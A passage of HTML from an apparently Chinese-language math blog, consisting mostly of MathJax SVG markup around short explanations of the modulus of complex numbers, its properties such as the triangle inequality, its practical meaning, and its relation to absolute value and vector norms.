214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mn" transform="translate(498,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(1179.6,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g></g><rect width="1230.6" height="60" x="120" y="220"></rect></g></g></g></svg></mjx-container>，即复数的模的商等于复数的商的模。</p></li><li><p><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.564ex;" xmlns="http://www.w3.org/2000/svg" width="20.481ex" height="2.26ex" role="img" focusable="false" viewBox="0 -749.5 9052.7 999"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="msub" transform="translate(278,0)"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mn" transform="translate(498,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1401.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(2402,0)"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mn" transform="translate(498,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(3303.6,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(3859.3,0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mo" transform="translate(4915.1,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="msub" transform="translate(5193.1,0)"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mn" transform="translate(498,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(6094.7,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(6594.9,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mo" transform="translate(7595.1,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="msub" transform="translate(7873.1,0)"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mn" transform="translate(498,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(8774.7,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g></g></g></svg></mjx-container>，即复数的模的和小于等于复数的模的和，这被称为三角不等式。</p></li></ol><p>复数的模在复数运算和分析中具有重要的应用，例如用于求解复数的幅角、逆元等。</p><h2 id="复数的模的现实意义"><a href="#复数的模的现实意义" class="headerlink" title="复数的模的现实意义"></a>复数的模的现实意义</h2><p>复数的模表示复数到原点的距离，因此在二维平面中，复数的模可以用来表示一个点到原点的距离。在实际应用中，复数的模具有以下现实意义：</p><ol><li><p>电磁场中的振幅：在电磁学中，复数可以表示电场或磁场的振幅和相位。复数的模表示电场或磁场的振幅，因此可以用来描述电磁场的强度。</p></li><li><p>信号处理中的能量：在信号处理中，复数可以表示信号的幅度和相位。复数的模表示信号的能量，因此可以用来描述信号的强度。</p></li><li><p>几何中的距离：在几何学中，复数可以表示平面上的点。复数的模表示点到原点的距离，因此可以用来计算点之间的距离。</p></li><li><p>数学中的性质：在数学中，复数的模具有很多重要的性质，例如模的乘积等于复数的乘积的模，模的商等于复数的商的模等。这些性质在复数运算和分析中具有重要的应用。</p></li></ol><p>综上所述，复数的模在不同领域中具有不同的现实意义，但都与强度、距离或能量等概念有关。</p><h2 id="向量的模"><a href="#向量的模" class="headerlink" title="向量的模"></a>向量的模</h2><p>你可能指的是绝对值符号 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.564ex;" xmlns="http://www.w3.org/2000/svg" width="2.892ex" height="2.26ex" role="img" focusable="false" viewBox="0 -749.5 1278.4 999"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(500.2,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mo" transform="translate(1000.4,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g></g></g></svg></mjx-container> 和向量的模（或长度） <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.564ex;" xmlns="http://www.w3.org/2000/svg" width="4.15ex" height="2.26ex" role="img" focusable="false" viewBox="0 -749.5 1834.4 999"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(278,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(778.2,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mo" transform="translate(1278.4,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(1556.4,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g></g></g></svg></mjx-container>。它们与复数的模确实有些相似之处，但在数学上具有不同的定义和应用。</p><p>绝对值符号 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.564ex;" xmlns="http://www.w3.org/2000/svg" width="2.892ex" height="2.26ex" role="img" focusable="false" viewBox="0 -749.5 1278.4 999"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(500.2,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mo" transform="translate(1000.4,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g></g></g></svg></mjx-container> 通常用于表示实数、复数、矩阵等的大小或距离。对于实数 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.294ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 572 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g></g></svg></mjx-container>，其绝对值表示 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.294ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 572 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g></g></svg></mjx-container> 到原点的距离，即 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.564ex;" xmlns="http://www.w3.org/2000/svg" width="6.863ex" height="2.26ex" role="img" focusable="false" viewBox="0 -749.5 3033.6 999"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(850,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(1405.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2461.6,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g></g></svg></mjx-container>（当 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.312ex;" xmlns="http://www.w3.org/2000/svg" width="5.442ex" height="1.819ex" role="img" focusable="false" viewBox="0 -666 2405.6 804"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(849.8,0)"><path data-c="2265" d="M83 616Q83 624 89 630T99 636Q107 636 253 568T543 431T687 361Q694 356 694 346T687 331Q685 329 395 192L107 56H101Q83 58 83 76Q83 77 83 79Q82 86 98 95Q117 105 248 167Q326 204 378 228L626 346L360 472Q291 505 200 548Q112 589 98 597T83 616ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mn" transform="translate(1905.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g></g></svg></mjx-container>）或 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.564ex;" xmlns="http://www.w3.org/2000/svg" width="8.623ex" height="2.26ex" role="img" focusable="false" viewBox="0 -749.5 3811.6 999"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(850,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(1405.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(2461.6,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(3239.6,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g></g></svg></mjx-container>（当 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.09ex;" xmlns="http://www.w3.org/2000/svg" width="5.442ex" height="1.597ex" role="img" focusable="false" viewBox="0 -666 2405.6 706"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(849.8,0)"><path data-c="3C" d="M694 -11T694 -19T688 -33T678 -40Q671 -40 524 29T234 166L90 235Q83 240 83 250Q83 261 91 266Q664 540 678 540Q681 540 687 534T694 519T687 505Q686 504 417 376L151 250L417 124Q686 -4 687 -5Q694 -11 694 -19Z"></path></g><g data-mml-node="mn" transform="translate(1905.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g></g></svg></mjx-container>）。对于复数 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="9.783ex" height="1.756ex" role="img" focusable="false" viewBox="0 -694 4324 776"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mo" transform="translate(742.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(1798.6,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(2549.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(3550,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mi" transform="translate(3979,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container>，其模也表示 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.052ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 465 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g 